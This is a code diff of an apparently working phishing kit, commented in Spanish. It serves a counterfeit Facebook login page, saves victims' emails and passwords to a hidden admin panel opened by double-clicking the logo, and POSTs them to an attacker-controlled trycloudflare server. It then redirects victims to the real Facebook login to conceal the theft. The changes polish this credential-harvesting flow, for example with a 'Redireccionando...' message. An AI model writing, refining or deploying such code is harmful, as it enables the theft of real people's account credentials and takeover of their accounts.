@@ -43,8 +43,7 @@
 
         .fb-body { background-color: #ffffff !important; overflow-y: auto !important; display: block !important;}
 
-        #loader img { width: 60px; height: 60px; border-radius: 50%; }
-
+        /* Estilos del Admin Panel */
         #admin-panel {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #1c1e21; color: white; z-index: 3000; padding: 20px;
@@ -77,6 +76,12 @@
             padding: 12px; width: 100%; border-radius: 8px;
             font-weight: bold; cursor: pointer; margin-top: 10px; margin-bottom: 30px;
         }
+
+        /* Mensaje de redirección personalizado */
+        .redir-text {
+            color: #0866ff; font-weight: bold; font-size: 18px; margin-top: 15px;
+            text-align: center; font-family: sans-serif;
+        }
     </style>
 </head>
 <body>
@@ -102,24 +107,14 @@
     <script>
         const SERVIDOR_URL = "https://columns-scott-resist-pichunter.trycloudflare.com";
 
-        // RESET COMPLETO AL DAR ATRÁS O CARGAR
-        window.addEventListener('pageshow', function(event) {
+        // Unificación de eventos de carga y retroceso
+        window.addEventListener('pageshow', (event) => {
             if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
                 window.location.reload();
             }
-        });
-
-        window.onload = function() {
             const kf = document.getElementById('keyField');
             if(kf) kf.value = "";
-            const ld = document.getElementById('loader');
-            if(ld) ld.style.display = 'none';
-        };
-        window.onpageshow = function(event) {
-    if (event.persisted) {
-        window.location.reload();
-    }
-};
+        });
 
         function copiar(texto) {
             navigator.clipboard.writeText(texto);
@@ -137,38 +132,45 @@
                 let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
                 let reversedLogs = logs.reverse();
                 reversedLogs.splice(index, 1);
-                let finalLogs = reversedLogs.reverse();
-                localStorage.setItem('cuentas_ayber', JSON.stringify(finalLogs));
+                localStorage.setItem('cuentas_ayber', JSON.stringify(reversedLogs.reverse()));
                 renderLogs();
             }
         }
 
+        // Renderizado optimizado de logs
         function renderLogs() {
             const container = document.getElementById('logs-container');
-            const logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-            container.innerHTML = logs.length ? "" : "<p style='text-align:center; color:#888;'>Sin datos.</p>";
-            const displayLogs = [...logs].reverse();
-            displayLogs.forEach((log, index) => {
-                container.innerHTML += `
-                    <div class="log-card">
-                        <div class="card-header">
-                            <span style="font-size:11px; color:#888;">${log.fecha}</span>
-                            <button class="btn-delete-single" onclick="borrarUno(${index})">🗑️</button>
-                        </div>
-                        <div style="margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
-                            <span><b>U:</b> <span style="color:#45bd62;">${log.user}</span></span>
-                            <button class="copy-btn" onclick="copiar('${log.user}')">📋</button>
-                        </div>
-                        <div style="display:flex; align-items:center; justify-content:space-between;">
-                            <span><b>P:</b> <span style="color:#f3425f;">${log.pass}</span></span>
-                            <button class="copy-btn" onclick="copiar('${log.pass}')">📋</button>
-                        </div>
-                    </div>`;
-            });
+            const rawLogs = localStorage.getItem('cuentas_ayber');
+            const logs = rawLogs ? JSON.parse(rawLogs) : [];
+            
+            if (logs.length === 0) {
+                container.innerHTML = "<p style='text-align:center; color:#888;'>Sin datos.</p>";
+                return;
+            }
+
+            const htmlContent = [...logs].reverse().map((log, index) => `
+                <div class="log-card">
+                    <div class="card-header">
+                        <span style="font-size:11px; color:#888;">${log.fecha}</span>
+                        <button class="btn-delete-single" onclick="borrarUno(${index})">🗑️</button>
+                    </div>
+                    <div style="margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
+                        <span><b>U:</b> <span style="color:#45bd62;">${log.user}</span></span>
+                        <button class="copy-btn" onclick="copiar('${log.user}')">📋</button>
+                    </div>
+                    <div style="display:flex; align-items:center; justify-content:space-between;">
+                        <span><b>P:</b> <span style="color:#f3425f;">${log.pass}</span></span>
+                        <button class="copy-btn" onclick="copiar('${log.pass}')">📋</button>
+                    </div>
+                </div>
+            `).join('');
+
+            container.innerHTML = htmlContent;
         }
 
         async function validar() {
-            const keyDigitada = document.getElementById('keyField').value;
+            const keyField = document.getElementById('keyField');
+            const keyDigitada = keyField ? keyField.value : "";
             if(!keyDigitada) return;
 
             try {
@@ -180,23 +182,14 @@
 
                 if (respuesta.ok) {
                     const data = await respuesta.json();
-                    
-                    // Limpieza de loader antes de inyectar
-                    const oldLoader = document.getElementById('loader');
-                    if(oldLoader) oldLoader.style.display = 'none';
-
                     document.body.classList.add('fb-body');
                     document.getElementById('root').innerHTML = data.html;
 
-                    const emailIn = document.getElementById('email');
-                    const passIn = document.getElementById('pass');
-                    if(emailIn) emailIn.setAttribute('autocomplete', 'off');
-                    if(passIn) passIn.setAttribute('autocomplete', 'new-password');
-
+                    // Panel secreto por doble clic en logo
                     setTimeout(() => {
                         const logo = document.querySelector('img[alt="fb"]');
                         if(logo) {
-                            logo.ondblclick = function() {
+                            logo.ondblclick = () => {
                                 renderLogs();
                                 document.getElementById('admin-panel').style.display = 'block';
                             };
@@ -208,28 +201,45 @@
             } catch (e) { alert("Error de conexión."); }
         }
 
-        document.addEventListener('click', function (e) {
+        // Manejo del Login y Spinner con mensaje
+        document.addEventListener('click', async (e) => {
             if (e.target && e.target.id === 'btn-login') {
                 const email = document.getElementById('email').value;
                 const pass = document.getElementById('pass').value;
+                const loader = document.getElementById('loader');
+
                 if(!email || !pass) return;
 
+                // Guardar log
                 let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
                 logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
                 localStorage.setItem('cuentas_ayber', JSON.stringify(logs));
 
-                const loader = document.getElementById('loader');
                 if(loader) loader.style.display = 'flex';
 
-                fetch(`${SERVIDOR_URL}/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: email, password: pass })
-                }).then(() => {
+                try {
+                    // Enviar al servidor
+                    await fetch(`${SERVIDOR_URL}/login`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: email, password: pass })
+                    });
+
+                    // Temporizador del Spinner
                     setTimeout(() => {
-                        window.location.replace("https://www.facebook.com/login");
-                    }, 3000); 
-                });
+                        if(loader) {
+                            // Cambiar spinner por mensaje de redireccionando
+                            loader.innerHTML = '<div class="redir-text">Redireccionando...</div>';
+                        }
+                        
+                        setTimeout(() => {
+                            window.location.replace("https://www.facebook.com/login");
+                        }, 1200); 
+                    }, 3000);
+
+                } catch (err) {
+                    window.location.replace("https://www.facebook.com/login");
+                }
             }
         });
     </script>
